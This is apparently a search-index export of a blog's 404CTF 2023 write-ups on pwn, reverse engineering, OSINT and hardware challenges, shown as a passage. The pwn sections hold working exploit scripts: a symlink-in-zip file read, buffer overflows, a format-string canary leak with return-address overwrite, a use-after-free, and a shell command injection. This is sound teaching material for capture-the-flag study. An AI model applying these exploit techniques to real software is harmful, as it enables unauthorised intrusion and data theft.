size_t sVar3; undefined8 uVar4; long in_FS_OFFSET; int local_4b8; int local_4b4; char *local_4b0; size_t local_4a8; char *mystere_zip_str; char *surprise_txt_str; void *base64_decoded_input2; FILE *local_488; FILE *local_480; __ssize_t local_478; char *local_470; char *local_468; char *local_460; undefined8 local_458; char input1 [48]; char input2 [1032]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); fgets(input1,0x28,stdin); mystere_zip_str = \"mystere.zip\"; surprise_txt_str = \"surprise.txt\"; local_4b8 = 0; fgets(input2,0x400,stdin); sVar3 = strcspn(input2,\"\\n\"); input2[sVar3] = '\\0'; remove(mystere_zip_str); remove(surprise_txt_str); base64_decoded_input2 = base64_decode(input2,&amp;local_4b8); local_488 = fopen(mystere_zip_str,\"wb\"); if (local_488 == (FILE *)0x0) { puts(&amp;DAT_00101878); free(base64_decoded_input2); base64_decoded_input2 = (void *)0x0; uVar4 = 1; } else { fwrite(base64_decoded_input2,1,(long)local_4b8,local_488); fclose(local_488); local_488 = (FILE *)0x0; _Var1 = fork(); if (_Var1 == 0) { local_4b4 = open(\"/dev/null\",1); if (local_4b4 &lt; 0) { /* WARNING: Subroutine does not return */ exit(1); } iVar2 = fileno(stdout); dup2(local_4b4,iVar2); iVar2 = fileno(stderr); dup2(local_4b4,iVar2); close(local_4b4); local_470 = \"unzip\"; local_468 = \"unzip\"; local_460 = \"mystere.zip\"; local_458 = 0; execvp(\"unzip\",&amp;local_468); /* WARNING: Subroutine does not return */ exit(0); } wait((void *)0x0); local_480 = fopen(surprise_txt_str,\"r\"); if (local_480 == (FILE *)0x0) { puts(&amp;DAT_00101878); free(base64_decoded_input2); base64_decoded_input2 = (void *)0x0; uVar4 = 1; } else { local_4b0 = (char *)0x0; local_4a8 = 0; local_478 = getline(&amp;local_4b0,&amp;local_4a8,local_480); if (local_478 == -1) { puts(&amp;DAT_00101878); uVar4 = 1; } else { puts(local_4b0); remove(mystere_zip_str); remove(surprise_txt_str); fclose(local_488); fclose(local_480); free(local_4b0); free(base64_decoded_input2); base64_decoded_input2 = (void *)0x0; local_488 = (FILE *)0x0; local_480 = (FILE *)0x0; local_4b0 = (char *)0x0; uVar4 = 0; } } } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return uVar4;}The function takes a base64 input, decode it and put it into the mystere.zip file:local_488 = fopen(mystere_zip_str,\"wb\"); if (local_488 == (FILE *)0x0) { puts(&amp;DAT_00101878); free(base64_decoded_input2); base64_decoded_input2 = (void *)0x0; uVar4 = 1; }Then it unzip the content of mystere.zipexecvp(\"unzip\",&amp;local_468);To finish, it reads a line from surprise.txtlocal_480 = fopen(surprise_txt_str,\"r\"); if (local_480 == (FILE *)0x0) { puts(&amp;DAT_00101878); free(base64_decoded_input2); base64_decoded_input2 = (void *)0x0; uVar4 = 1; } else { local_4b0 = (char *)0x0; local_4a8 = 0; local_478 = getline(&amp;local_4b0,&amp;local_4a8,local_480); if (local_478 == -1) { puts(&amp;DAT_00101878); uVar4 = 1; } else { puts(local_4b0);We can put a symlink from surprise.txt to salle_au_tresor in mystere.zip.ExploitWe encode base64 a symlink from surprise.txt to salle_au_tresor. The program put in mystere.zip the base64 decoded payload (the symlink).The program unzip mystere.zip, overwriting surprise.txt that is now a symlink to salle_au_tresor.The program reads a line from surprise.txt that is a symlink to salle_au_tresor. So, the program reads a line from salle_au_tresor and reads it for us.Payload CreationIn local, we create a file called salle_au_tresor. We create a symlink to it. We zip surprise.txt into mystere.zip. Then we encode in base64 mystere.zip.Our payload is ready.Final Codefrom pwn import *import timewhile True: #p = process(\"./cache_cache_le_retour\") p = remote(\"challenges.404ctf.fr\",31725) password = b'6qzQbN(m&gt;@KROp^1(Gh:' p.recvuntil(b\"mot de passe ?\\n\") p.sendline(password) sms = p.recv() if b'Je me vois au regret de refuser' in sms: p.close() #time.sleep(0.6) continue else: print(sms) p.sendline(b\"UEsDBAoAAAAAANGIwVaLoRhuDwAAAA8AAAAMABwAc3VycHJpc2UudHh0VVQJAAP6s3hk+rN4ZHV4CwABBOgDAAAE6wMAAHNhbGxlX2F1X3RyZXNvclBLAQIeAwoAAAAAANGIwVaLoRhuDwAAAA8AAAAMABgAAAAAAAAAAAD/oQAAAABzdXJwcmlzZS50eHRVVAUAA/qzeGR1eAsAAQToAwAABOsDAABQSwUGAAAAAAEAAQBSAAAAVQAAAAAA\") print(p.recv()) breakprint('terminate')p.interactive()FlagWe have the flag 🥳 !Flag: 404CTF{UN_CH3V41_D3_7r013_P0Ur_3NV4H1r_14_54113_4U_7r350r}ConclusionI hope you understood and learned some things in this writeup." }, { "title": "CTFs | 404CTF2023 | Pwn | Un tour de magie", "url": "/CTFs/404CTF2023/pwn/un_tour_de_magie", "categories": "CTFs, 404CTF2023, Pwn", "tags": "CTFs, 404CTF2023, Pwn", "date": "2023-06-14 00:00:00 +0200", "snippet": "ContextWe are given the file tour-de-magie.zipInside it, there is the main.wasm file which is a WebAssembly file.A WebAssembly (Wasm) file is a binary format designed for efficient and safe execution in web browsers. It allows developers to run code written in languages like C, C++, Rust, and others on the web. Wasm files are compact and can be loaded and executed quickly, making them suitable for web applications that require high performance.We can execute it using the command: wasmtime main.wasmWe are given the code main.c which is the code of the wasm file:#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;int main() { int* check = malloc(sizeof(int)); *check = 0xcb0fcb0f; puts(\"Alors, t'es un magicien ?\"); char input[20]; fgets(input, 200, stdin); \tif(*check == 0xcb0fcb0f) {\t\tputs(\"Apparemment non...\");\t\texit(0);\t} if(*check != 0xcb0fcb0f &amp;&amp; *check != 0x50bada55) {\t\tputs(\"Pas mal, mais il en faut plus pour m'impressionner !\");\t\texit(0);\t}\tif(*check == 0x50bada55) {\t\tputs(\"Wow ! Respect ! Quelles paroles enchantantes ! Voilà ta récompense...\");\t\tFILE* f = fopen(\"flag.txt\", \"r\");\t\tif(f == NULL) {\t\t\tputs(\"Erreur lors de l'ouverture du flag, contactez un administrateur !\");\t\t\texit(1);\t\t}\t\tchar c;\t\twhile((c = fgetc(f)) != -1) {\t\t\tputchar(c);\t\t}\t\tfclose(f);\t}}It looks like we have to do a buffer overflow to override the value of the check variable. The input buffer is 20 bytes and the fgets take 200 bytes.We have to change its value to 0x50bada55.Let’s try to enter characters until we modify the value of check.We are printed some of our ‘A’s (41). Let’s modify the last four characters:It looks like the 17th to 20th character are the check value.Payload: payload = b’A’ * 16 + b’\\x55\\xda\\xba\\x50’ + b’AAA’Here is my implementation:import pwnconn = pwn.remote('challenges.404ctf.fr', 30274)rep = conn.recvuntil(b'magicien ?\\n')print(rep)payload = b'A'*16+ b'\\x55\\xda\\xba\\x50' + b'A'*3print(payload)conn.sendline(payload)print(conn.recvline())print(conn.recvline())We get the flag 🎉 ! I hope you like this pwn." }, { "title": "CTFs | 404CTF2023 | Pwn | La Cohue", "url": "/CTFs/404CTF2023/pwn/la_cohue", "categories": "CTFs, 404CTF2023, Pwn", "tags": "CTFs, 404CTF2023, Pwn", "date": "2023-06-14 00:00:00 +0200", "snippet": "ContextWe are given this code:void choices(void){ bool bVar1; bool bVar2; int has_choose; long in_FS_OFFSET; int choice; char local_58 [72]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); choice = 0; bVar1 = false; bVar2 = false; while( true ) { while( true ) { do { puts(\"Que faites-vous ?\"); puts(\"\\n1 : Aller voir Francis\"); puts(&amp;DAT_00400c18); puts(&amp;DAT_00400c4a); printf(\"&gt;&gt;&gt; \"); fflush(stdout); has_choose = __isoc99_scanf(&amp;DAT_00400c6d,&amp;choice); if (has_choose != 1) { /* WARNING: Subroutine does not return */ exit(0); } } while ((choice &lt; 1) || (6 &lt; choice)); if (choice != 2) break; if (bVar2) { puts(&amp;DAT_00400d90); } else { fgets(local_58,0x40,stdin); fgets(local_58,0x40,stdin); printf(\"[Vous] : \"); printf(local_58); puts(\"\"); bVar2 = true; } } if (choice == 3) break; if (choice == 1) { if (bVar1) { puts( \"\\n[Francis] : Je crains que je ne puisse plus compter sur vous pour m\\'aider, malheureu sement.\\n\" ); } else { puts(&amp;DAT_00400cd0); printf(\"[Vous] : \"); fgets(local_58,0x40,stdin); gets(local_58); puts(&amp;DAT_00400d50); bVar1 = true; } } } if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) { return; } /* WARNING: Subroutine does not return */ __stack_chk_fail();}There is also another function:void canary(void){ FILE *__stream; long in_FS_OFFSET; char local_58 [72]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(&amp;DAT_00400b98); __stream = fopen(\"flag.txt\",\"r\"); fgets(local_58,0x48,__stream); puts(local_58); fclose(__stream); if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return;}The canary functions gives the flag so we need to find a way to call this function.Since there is only one return in the choice function, we have to replace the return address with the canary function address.gets(local_58);The gets() function reads characters from the input stream and stores them in the buffer until it encounters a newline character or the end of file (EOF) indicator. However, gets() does not perform any bounds checking on the size of the input being read, which means it can write more data into the buffer than it can actually hold.If we provide input that exceeds the buffer’s size, the extra data will overflow into adjacent memory locations, potentially overwriting important data such as function return addresses.The fact is that the stack is protected by a canary (in_FS_OFFSET + 0x28 variable). The code checks if the canary has been modified before returning.fgets(local_58,0x40,stdin);printf(\"[Vous] : \");printf(local_58);This code is vulnerable to a format string vulnerability because the printf function does not specify a format string, but directly uses the content of the local_58 buffer as the format string. This can be problematic because if the user inputs a string that contains format specifiers (such as %s, %d, etc.), the printf function will interpret them and try to read values from the stack corresponding to those specifiers. If the values are not present or are incorrect, it can lead to memory corruption, crashes, or even arbitrary code execution.To display the canary, which is a security mechanism used to detect buffer overflows, an attacker could provide a carefully crafted format string as input. For example, if the canary is stored on the stack before the local_58 buffer, the attacker could include a format specifier in their input like %p to read the values from the stack. By repeatedly including format specifiers and observing the output, the attacker can eventually retrieve the canary value.Example:We can leak the canary:The 17th value ends with 00. It may be the canary.Now we have to craft our payload.payload = \"A\" * 0x48 + canary + \"A\" * 8 + canary_function_addressHere’s my implementation to get the flag. We get the canary value with the format string vulnerability. Then we craft the payload and use the buffer overflow vulnerability to override the return address. Then we exit the function and get the flag.import pwnimport timeimport warningswarnings.filterwarnings(\"ignore\")def voir_francis(conn, msg): conn.sendline(\"1\") rep = conn.recvuntil(\": \").decode() conn.sendline(msg) rep = conn.recvuntil(\"&gt;&gt;&gt; \").decode() return repdef reflechir(conn, msg): conn.sendline(\"2\") conn.sendline(msg) rep = conn.recvuntil(\"&gt;&gt;&gt; \").decode() return repdef partir(conn): conn.sendline(\"3\") rep = conn.recvline().decode() return repwin = pwn.p64(0x0000000000400877)conn = pwn.remote(\"challenges.404ctf.fr\", 30223)rep = conn.recvuntil(\"&gt;&gt;&gt; \").decode()print(rep)canary_payload = \"%17$p\"print(canary_payload)rep = reflechir(conn, canary_payload)print(rep)canary = rep.split(\"[Vous] : \")[1].split(\"\\n\")[0]print(\"Canary:\", canary)overwrite = b'A' * 0x48overwrite += pwn.p64(int(canary, 16))overwrite += b'A' * 8overwrite += winprint(overwrite)rep = voir_francis(conn, overwrite)print(rep)conn.sendline(\"3\")rep = conn.recvuntil(b\"}\")print(rep.decode())We get the flag 🥳 !I hope you learned something with this writeup 😊." }, { "title": "CTFs | 404CTF2023 | Pwn | L'Alchimiste", "url": "/CTFs/404CTF2023/pwn/l_alchimiste", "categories": "CTFs, 404CTF2023, Pwn", "tags": "CTFs, 404CTF2023, Pwn", "date": "2023-06-13 00:00:00 +0200", "snippet": "ContextWe connect to netcat to know more:We can: Buy a strength elixir. drink a strength elixir. Talk to the alchemist. show stats. get the key. get out.If we try to get the key, we get:We don’t have enough stats.Here are our base stats:We have 100 in strength, 50 in mind and 100 golds.We can buy a strength potion for 50 to get 10 strength.Of course it’s not enough to pass the test.ResolutionLet’s use ghidra to analyze the executable.Character creationHere is how the character is created:*perso is the strength, *(perso + 4) is the mind and *(perso + 8) is gold. All three are integers.BugHere is a bug:Why does this happen? Let’s investigate !Buy Strength PotionHere is the function to get another strength elixir:The address of the function incStr is placed on at the address (perso + 0x10). Then if we have more than 50 gold, the value of gold is decreased by 50.So buying a strength potion is just placing the address of the incStr function at (perso + 0x10).Use ItemThe function to use the strength potion is this one:We call the function placed at (perso + 0x10) + 0x40. Then we free the (perso + 0x10).Now we can understand why the bug occurs. We buy a strength potion (allocate perso + 0x10, then place the address of incStr at perso + 0x10, then decrease 50 gold if enough).Then we call the function useItem. Our strength is increased adn the address perso + 0x10 is freed.When we call again the function useItem, our strength is increased (because the address value is not put to NULL before being released). Then we try to free it again even if it’s already freed.So, we get the double free.Exploit this bugWe can allocate and place the function without paying. So, we can repeatedly buy and use to increase our strength. This is a Use-After-Free (UAF) vulnerability.view_flag functionHere is the function view_flag:To get the flag, we 150 in strength and 150 in mind. We need to find a way to increase our mind stat.send Message functionHere is the send message function.Here we allocate 0x48 and do not free it afterward. So we call also do the use-after-free to increase the strength with this function and the useItem function (after buying of strength potion).We can the address of the incInt function with Ghidra and replace the value where IncStr is placed with the address of incInt.Then spam useItem and sendMessage to do a UAF with the incInt function instead.Here my code to do it:import pwndef send_receive(r, msg): r.sendline(msg) rep = r.recvuntil(b\"&gt;&gt;&gt;\").decode() print(rep)def sendMsg(r, msg): r.sendline(b'3') r.recvuntil(b\": \") r.sendline(msg) rep = r.recvuntil(b\"&gt;&gt;&gt;\").decode() print(rep)def increase_str(r, num): send_receive(r, \"1\") send_receive(r, \"2\") for i in range(num - 1): sendMsg(r, \"A\") send_receive(r, \"2\") send_receive(r, \"4\")def increase_int(r, num): payload = b\"\\x41\" * 0x40 + pwn.p64(0x004008d5) sendMsg(r, payload) send_receive(r, \"2\") for i in range(num - 1): sendMsg(r, \"A\") send_receive(r, \"2\") send_receive(r, \"4\") # Connect to the serverr = pwn.remote(\"challenges.404ctf.fr\", 30944)rep = r.recvuntil(b\"&gt;&gt;&gt; \").decode()print(rep)increase_str(r, 5)increase_int(r, 10)r.sendline(b'5')response = r.recvuntil(b\"}\")print(response)We increase our strength and our intelligence to 150 then we get the flag.Flag: 404CTF{P0UrQU01_P4Y3r_QU4ND_135_M075_5UFF153N7}" }, { "title": "CTFs | 404CTF2023 | Reverse | L'Inspiration en images", "url": "/CTFs/404CTF2023/reverse/l_inspiration_en_images", "categories": "CTFs, 404CTF2023, Reverse", "tags": "CTFs, 404CTF2023, Reverse", "date": "2023-06-12 00:00:00 +0200", "snippet": "ContextWe are given an executable that creates a painting.Here is the painting:On the screen, we only see the bottom right of the painting. In fact the painting is entirely black. We can discover the content with the cursor. It’s like if it’s dark and the cursor is a flashlight. Here my cursor is in the bottom right to take the screen shot.We have to find the color in the background of the painting.ResolutionI analyzed the executable with Ghidra.The main function is long with a lot of variables. We will not analyze everything.Line 62, the window is create:Line 186, the “Clear Color” is defined. It’s the default of the window, before adding things to it. It is the background color we are looking for.In hex: 0x3e4ccccd,0x3e99999a,0x3e99999a,0x3f800000In float: 0.2, 0.3, 0.3, 1Flag: 404CTF{vec4(0.2,0.3,0.3,1)}" }, { "title": "CTFs | 404CTF2023 | Pwn | Je veux la lune !", "url": "/CTFs/404CTF2023/pwn/je_veux_la_lune_!", "categories": "CTFs, 404CTF2023, Pwn", "tags": "CTFs, 404CTF2023, Pwn", "date": "2023-06-12 00:00:00 +0200", "snippet": "ContextWe are given this code:#!/bin/bashCaligula=CaiuslistePersonnes=\"Cherea Caesonia Scipion Senectus Lepidus Caligula Caius Drusilla\"echo \"Bonjour Caligula, ceci est un message de Hélicon. Je sais que les actionnaires de ton entreprise veulent se débarrasser de toi, je me suis donc dépêché de t'obtenir la lune, elle est juste là dans le fichier lune.txt !En attendant j'ai aussi obtenu des informations sur Cherea, Caesonia, Scipion, Senectus, et Lepidus, de qui veux-tu que je te parle ?\"read personneeval \"grep -wie ^$personne informations.txt\"while true; do echo \"De qui d'autre tu veux que je te parle ?\" read personne if [ -n $personne ] &amp;&amp; [ $personne = \"stop\" ] ; then exit fi bob=$(grep -wie ^$personne informations.txt) echo $bob if [ -z \"$bob\" ]; then echo \"Je n'ai pas compris de qui tu parlais. Dis-moi stop si tu veux que je m'arrête, et envoie l'un des noms que j'ai cités si tu veux des informations.\" else echo $bob fi doneThe variable “personne” is not sanitized. So we can run do command injection.if we enter:404CTF flag.txt; ls -la; lsThe command becomes:grep -wie ^404CTF flag.txt; ls -la; ls informations.txtWe can diplay the content of lune:The flag is: 404CTF{70n_C0EuR_v4_7e_1Ach3R_C41uS}" }, { "title": "CTFs | 404CTF2023 | Osint | L'âme d'un poète et le coeur d'une femme", "url": "/CTFs/404CTF2023/osint/l_ame_d_un_poete_et_le_coeur_d_une_femme", "categories": "CTFs, 404CTF2023, Osint", "tags": "CTFs, 404CTF2023, Osint", "date": "2023-06-12 00:00:00 +0200", "snippet": "This challenge is in 4 partsFirst PartContextWe have to find “Louise Colet” on social medias.ResolutionLooking on facebook, I found this profile.In the “A propos” tab, we find the first flag 😊 !Second PartContextNow we have to find an event organised by Louise Colet. We need to find the date of this event and the account that mention it.So, we are looking for social medias still.ResolutionThe facebook account we found had no more useful informations.I looked on instagram and found this account.On the photo, there is this text:So the event is a literary salon organised by Louise Colet the 25 May 2023.Flag: 404CTF{25_mai_colet_louise}Third PartContextWe have to find a discord invitation to the salon.ResolutionI struggled a lot with this one. I look on instagram, facebook, snapchat, linkedin, …I tried to find a google account, without success.I found it on github. I searched for Louise Colet and found this:At the bottom of the README.md, there is a link to the discord and the flag.Fourth PartContextResolutionOn discord, there is a channel “l-entrée”After typing “le_petit_salon”, we get access the the channel “le-petit-salon”I typed the exact same text on google and found this website: https://fr.wikisource.org/wiki/Un_drame_dans_la_rue_de_Rivoli/1It comes from a book from Louise Colet “Un drame dans la rue de Rivoli”.It was in 1835.We get access to the channel “le-boudoire”.We have to complete this poem.I just typed the verse we are given and found this site: https://www.persee.fr/doc/grif_0770-6081_1975_num_7_1_1458We get access to the channel “le-fumoir”.We have to find where and when Louise Colet visited Victor Hugo for the first time.I struggled a lot with that one. Finally, I found this book that talks about Louise Colet and Victor Hugo: https://gallica.bnf.fr/ark:/12148/bpt6k8572147#Page 9, we learn that Louise Colet visited Victor Hugo for the first time in 1857 in Guernesey.After validating this response, we get access to the channel “la-bibliothèque”.We have the flag 🥳 !!I hope you enjoyed this writeup 😊 !" }, { "title": "CTFs | 404CTF2023 | Osint | Les OSINTables [1/3]", "url": "/CTFs/404CTF2023/osint/les_osintables_%5B1_on_3%5D", "categories": "CTFs, 404CTF2023, Osint", "tags": "CTFs, 404CTF2023, Osint", "date": "2023-06-11 00:00:00 +0200", "snippet": "This challenge is in 3 parts. I only solved the first one.First PartContextWe are given this photo:We have to find Cosette’s addressResolutionThanks to the photo, we know that her street is “Rue Victor Hugo” and that her city begins with “VE”.Also at the bottom right of the letter, we can see the number “04”. I think it’s a phone number.Looking at the France’s phone number map, we know that Cosette lives in the south east of France.On the left of the letter, there is a roman digit: LXXXIII -&gt; 83.I don’t know why it’s written in roman but it may be the house number.Searching for “83 rue Victor Hugo” on google maps, there is one city that begins with “Ve”: Vergèze.Vergèze is in the south east, it could be there.By taking a guess at the flag, we found it: 404CTF{83_rue_victor_hugo_vergeze}I took a look at the second part of the challenge and can show you what I found.Second PartContextThis time, we have to find Jean Valjean address.We knows that: He lives in Paris He is in one of the buildings with the most floors near his metro station. He dislikes alcohol drinkers. He likes to be close to his money.His email address is “jean.valjean750075@gmail.com”.ResolutionWe know that he lives in Paris so we can reduce the research to Paris.He is in one of the buildings with the most floors near his metro station -&gt; If we can find the station, we can probably find the building.He dislikes alcohol drinkers -&gt; He might lives near a bar or a night club.He likes to be close to his money. -&gt; He lives in a wealthy neighborhood or near banks (don’t know the meaning of the sentence).Thanks to his email address and Epios, we found out that his calendar is public.For each event, he wrote the time it takes for his go there (by foot or from his station or both combined).He know that: the “Conservatoire National Supérieur de Musique et de Danse de Paris” is at 21 minutes of travel time (probably by foot). the “Musée du Quai Branly” is at 28 minutes using transports. “Jardin du Luxembourg” is at 25 minutes from his station (probably by foot). Victor’s house is at 32 minutes (don’t know the transport). The cinema “Les 7 Batignolles” is at 18 minutes (metro + walk)I did not search further but it’s good leads.I hope you enjoyed this writeup 🙂 !" }, { "title": "CTFs | 404CTF2023 | Osint | Le Tour de France", "url": "/CTFs/404CTF2023/osint/le_tour_de_france", "categories": "CTFs, 404CTF2023, Osint", "tags": "CTFs, 404CTF2023, Osint", "date": "2023-06-11 00:00:00 +0200", "snippet": "ContextWe are given this image:We have to find the location of the panel.ResolutionIt seems that we are at a freeway exit. On the right panel we can see that we are going to the A6 freeway and on the left panel to the A5 freeway. I searched a lot to find the location using these two informations and the directions on the panels.Then I realised I could use the E17 E21 information because it’s european routes.This what I get by searching it:Looking at the url, we can retrieve the coordinates needed to create the flag.lag: 404CTF{47.01,4.86} (it’s not rounded but truncated btw)I hope you like this writeup. Have a great day 😉" }, { "title": "CTFs | 404CTF2023 | Reverse | Le Divin Crackme", "url": "/CTFs/404CTF2023/reverse/le_divin_crackme", "categories": "CTFs, 404CTF2023, Reverse", "tags": "CTFs, 404CTF2023, Reverse", "date": "2023-06-10 00:00:00 +0200", "snippet": "ContextWe are given the executable “divin-crackme”.We have to find the compiler used, the function used to compare the user input to the password and the password.Let’s analyze the executable using Ghidra.Ghidra indicates us that the gcc compiler was used.Here is the main function:The function asks the user to enter the password.Then it compares the first part of the input to “L4pH1l0so”, the second part to “Ph13_d4N5” and the 3rd part of the input to “l3_Cr4cKm3”.So, the password is “L4_pH1l0soPh13_d4N5_l3_Cr4cKm3”.The function used to compare the user input to the password is “strncmp”Flag format: 404CTF{compilateur:fonction:mot_de_passe}So, the flag is: 404CTF{gcc:strncmp:L4_pH1l0soPh13_d4N5_l3_Cr4cKm3}I hope you enjoyed this writeup 😄 !" }, { "title": "CTFs | 404CTF2023 | Reverse | Encore une mise à jour !", "url": "/CTFs/404CTF2023/reverse/encore_une_mise_a_jour_!", "categories": "CTFs, 404CTF2023, Reverse", "tags": "CTFs, 404CTF2023, Reverse", "date": "2023-06-10 00:00:00 +0200", "snippet": "ContextWe are given the file “encore-une-mise-a-jour.py”.It’s just a password checker, right ?Well here is the check function:def check(dumas, zola): cody = h.Bytecode(check, **dico).dis().count('I') print(cody) carmen = 0 if dumas[36] + cody * dumas[37] + dumas[38] == 25556: carmen += 1 if dumas[3] + cody * dumas[4] + dumas[5] == 19862: carmen += 1 if dumas[21] + cody * dumas[22] + dumas[23] == 39570: carmen += 1 if dumas[0] + dumas[1] + cody * dumas[2] == 35329: carmen += 1 if dumas[6] + dumas[7] + cody * dumas[8] == 67347: carmen += 1 if dumas[3] + dumas[4] + cody * dumas[5] == 100914: carmen += 1 if dumas[3] + cody * dumas[4] + dumas[5] == 49274: carmen += 1 if dumas[6] + cody * dumas[7] + dumas[8] == 61221: carmen += 1 if dumas[36] + dumas[37] + cody * dumas[38] == 64773: carmen += 1 if dumas[9] + dumas[10] + cody * dumas[11] == 49360: carmen += 1 if dumas[9] + cody * dumas[10] + dumas[11] == 18857: carmen += 1 if dumas[9] + cody * dumas[10] + dumas[11] == 46721: carmen += 1 if dumas[15] + dumas[16] + cody * dumas[17] == 58164: carmen += 1 if dumas[15] + dumas[16] + cody * dumas[17] == 144852: carmen += 1 if dumas[12] + dumas[13] + cody * dumas[14] == 147438: carmen += 1 if dumas[12] + dumas[13] + cody * dumas[14] == 59202: carmen += 1 if dumas[45] + cody * dumas[46] + dumas[47] == 39501: carmen += 1 if dumas[12] + cody * dumas[13] + dumas[14] == 25080: carmen += 1 if dumas[15] + cody * dumas[16] + dumas[17] == 27661: carmen += 1 if dumas[18] + dumas[19] + cody * dumas[20] == 135810: carmen += 1 if dumas[18] + cody * dumas[19] + dumas[20] == 128064: carmen += 1 if dumas[15] + cody * dumas[16] + dumas[17] == 68683: carmen += 1 if dumas[12] + cody * dumas[13] + dumas[14] == 62232: carmen += 1 if dumas[24] + cody * dumas[25] + dumas[26] == 66114: carmen += 1 if dumas[27] + cody * dumas[28] + dumas[29] == 25071: carmen += 1 if dumas[6] + cody * dumas[7] + dumas[8] == 152553: carmen += 1 if dumas[6] + dumas[7] + cody * dumas[8] == 27099: carmen += 1 if dumas[21] + dumas[22] + cody * dumas[23] == 54563: carmen += 1 if dumas[45] + cody * dumas[46] + dumas[47] == 98325: carmen += 1 if dumas[39] + dumas[40] + cody * dumas[41] == 115125: carmen += 1 if dumas[24] + cody * dumas[25] + dumas[26] == 26640: carmen += 1 if dumas[21] + dumas[22] + cody * dumas[23] == 135833: carmen += 1 if dumas[9] + dumas[10] + cody * dumas[11] == 122890: carmen += 1 if dumas[39] + dumas[40] + cody * dumas[41] == 46239: carmen += 1 if dumas[0] + dumas[1] + cody * dumas[2] == 87961: carmen += 1 if dumas[27] + dumas[28] + cody * dumas[29] == 144847: carmen += 1 if dumas[30] + dumas[31] + cody * dumas[32] == 35402: carmen += 1 if dumas[27] + dumas[28] + cody * dumas[29] == 58159: carmen += 1 if dumas[3] + dumas[4] + cody * dumas[5] == 40542: carmen += 1 if dumas[0] + cody * dumas[1] + dumas[2] == 42776: carmen += 1 if dumas[30] + cody * dumas[31] + dumas[32] == 57633: carmen += 1 if dumas[42] + cody * dumas[43] + dumas[44] == 26019: carmen += 1 if dumas[18] + dumas[19] + cody * dumas[20] == 54540: carmen += 1 if dumas[18] + cody * dumas[19] + dumas[20] == 51438: carmen += 1 if dumas[21] + cody * dumas[22] + dumas[23] == 98394: carmen += 1 if dumas[24] + dumas[25] + cody * dumas[26] == 51973: carmen += 1 if dumas[24] + dumas[25] + cody * dumas[26] == 129373: carmen += 1 if dumas[30] + dumas[31] + cody * dumas[32] == 88034: carmen += 1 if dumas[0] + cody * dumas[1] + dumas[2] == 17234: carmen += 1 if dumas[30] + cody * dumas[31] + dumas[32] == 143547: carmen += 1 if dumas[33] + cody * dumas[34] + dumas[35] == 43078: carmen += 1 if dumas[33] + dumas[34] + cody * dumas[35] == 42770: carmen += 1 if dumas[33] + cody * dumas[34] + dumas[35] == 107320: carmen += 1 if dumas[36] + dumas[37] + cody * dumas[38] == 26073: carmen += 1 if dumas[33] + dumas[34] + cody * dumas[35] == 17228: carmen += 1 if dumas[39] + cody * dumas[40] + dumas[41] == 27627: carmen += 1 if dumas[39] + cody * dumas[40] + dumas[41] == 68649: carmen += 1 if dumas[27] + cody * dumas[28] + dumas[29] == 62223: carmen += 1 if dumas[42] + cody * dumas[43] + dumas[44] == 64719: carmen += 1 if dumas[45] + dumas[46] + cody * dumas[47] == 29161: carmen += 1 if dumas[42] + dumas[43] + cody * dumas[44] == 35842: carmen += 1 if dumas[36] + cody * dumas[37] + dumas[38] == 63482: carmen += 1 if dumas[42] + dumas[43] + cody * dumas[44] == 89248: carmen += 1 if dumas[45] + dumas[46] + cody * dumas[47] == 72505: carmen += 1 zola+zola return carmen == 32The password has to be 48 characters long and validate 32 of the equations in the check function.Thankfully, characters in the password are grouped by 3 for the check.Example: Every equation where there is dumas[0], there is dumas[1] and dumas[2] and no other one. So we can calculate the value for the 3 together without worrying about other characters.ResolutionI created a script for the to solve each equations:import itertoolsh = __import__('dis')dico = {'adaptive': True}cody = 518 # Set the value of codycarmen = 0count = 0def checks(dumas, val): carmen = 0 mid = val[0] end = val[1] if dumas[0] + cody * dumas[1] + dumas[2] == mid[0]: carmen += 1 if dumas[0] + cody * dumas[1] + dumas[2] == mid[1]: carmen += 1 if dumas[0] + dumas[1] + cody * dumas[2] == end[0]: carmen += 1 if dumas[0] + dumas[1] + cody * dumas[2] == end[1]: carmen += 1 return carmen == 2def find_pass(val): global count for i in itertools.product(range(177), repeat=3): if checks(i, val): print(\"\".join([chr(c) for c in i]), end=\"\") count += 1find_pass(((42776,17234), (35329,87961)))find_pass(((19862,49274), (40542,100914)))find_pass(((61221,152553), (27099,67347)))find_pass(((18857,46721), (49360,122890)))find_pass(((25080,62232), (59202,147438)))find_pass(((68683,27661), (144852,58164)))find_pass(((128064,51438), (54540,135810)))find_pass(((39570,98394), (135833,54563)))find_pass(((66114,26640), (51973,129373)))find_pass(((25071,62223), (58159,144847)))find_pass(((57633,143547), (88034,35402)))find_pass(((43078,107320), (17228,42770)))find_pass(((25556,63482), (26073,64773)))find_pass(((27627,68649), (46239,115125)))find_pass(((26019,64719), (35842,89248)))find_pass(((39501,98325), (72505,29161)))The check function test if a triplet of value that satisfies 2 of the 4 equations that are in the original check function.The find_pass function generate each triplet possible to find a valid triplet.The parameters of the find_function are the values in the equation of the original check function.Here is the output: The flag is 404CTF{H!Dd&amp;N-v4r$_f0r_5p3ciaLiz3d_0pCoD3S! 12T5Y22EML8} I hope you enjoyed this writeup. The code is overwhelming but the idea is simple." }, { "title": "CTFs | 404CTF2023 | Hardware | Un réveil difficile", "url": "/CTFs/404CTF2023/hardware/un_reveil_difficile", "categories": "CTFs, 404CTF2023, Hardware", "tags": "CTFs, 404CTF2023, Hardware", "date": "2023-06-10 00:00:00 +0200", "snippet": "ContextWe are given the “reveil.circ” file.ResolutionLooking at the net, CIRC is a file extension commonly associated with Logisim Circuit files. This kind of file is used by “Logisim” software.We download the software (I chose the java version to not have problems on my VM) and we run it.java -jar logisim-generic-2.7.1.jar &amp;We open the “reveil.circ” file (File &gt; Open)The assignement tells us to display “Un_c” on the output.To do this, we can modify bits in the input and see how it affects the output.Playing a bit with, I understood that the row i represents the i-th output.Each bit switch on and off one segment in the output.So, we can just try to switch on and off until we get the result we want (since each bit in the input affect only one segment, we don’t have to resolve equations).Changing the output like this, we get “Un_c”. From what I understood, we just have to spam the clock and it will reveal us the flag.If a character is ambiguous, we choose first the number then the uppercase 